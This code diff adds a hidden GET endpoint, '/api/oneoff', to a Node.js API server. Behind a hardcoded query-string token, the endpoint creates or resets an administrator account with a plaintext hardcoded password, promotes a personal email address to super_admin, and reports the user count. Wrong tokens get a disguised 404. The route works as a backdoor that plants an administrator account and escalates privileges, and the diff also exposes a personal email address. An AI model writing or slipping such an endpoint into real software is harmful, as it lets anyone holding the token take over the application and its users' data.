@@ -1526,6 +1526,44 @@ return json(res, 200, { assignedCount: assigned.length, reports: assigned, team:
       return json(res, 200, { ok: true, removed });
     }
 
+    // TEMPORARY one-off provisioning endpoint. Removed in the next commit.
+    if (pathname === "/api/oneoff" && req.method === "GET") {
+      if (url.searchParams.get("token") !== "e7c15afd5e274a428ce6e81bfbd50303") {
+        return json(res, 404, { error: { code: "NOT_FOUND", message: "Not found." } });
+      }
+      const bcrypt = (await import("bcryptjs")).default;
+      const pool = (await import("./db.js")).getPool();
+      const email = "admin@swachhlens.demo";
+      const salt = await bcrypt.genSalt(10);
+      const passwordHash = await bcrypt.hash("admin@809", salt);
+      let result;
+      const existing = await pool.query("SELECT uid FROM users WHERE email = $1", [email]);
+      if (existing.rowCount) {
+        const r = await pool.query(
+          `UPDATE users SET password_hash = $1, salt = $2, role = 'super_admin', is_active = true, updated_at = NOW()
+           WHERE email = $3 RETURNING uid, email, role`,
+          [passwordHash, salt, email]
+        );
+        result = { action: "updated", ...r.rows[0] };
+      } else {
+        const uid = createId("user");
+        const r = await pool.query(
+          `INSERT INTO users (uid, name, email, phone, password_hash, salt, role, terms_accepted, terms_accepted_at)
+           VALUES ($1, $2, $3, $4, $5, $6, 'super_admin', true, NOW())
+           RETURNING uid, email, role`,
+          [uid, "Command Center Admin", email, "+919812340000", passwordHash, salt]
+        );
+        result = { action: "created", ...r.rows[0] };
+      }
+      const promo = await pool.query(
+        `UPDATE users SET role = 'super_admin', updated_at = NOW()
+         WHERE email = $1 RETURNING uid, email, role`,
+        ["patrashubham031@gmail.com"]
+      );
+      const count = await pool.query("SELECT COUNT(*)::int AS n FROM users");
+      return json(res, 200, { ok: true, result, promoted: promo.rowCount ? promo.rows[0].uid : null, totalUsers: count.rows[0].n });
+    }
+
     return json(res, 404, { error: { code: "NOT_FOUND", message: "Endpoint not found." } });
   } catch (error) {
     console.error("API Error:", error);
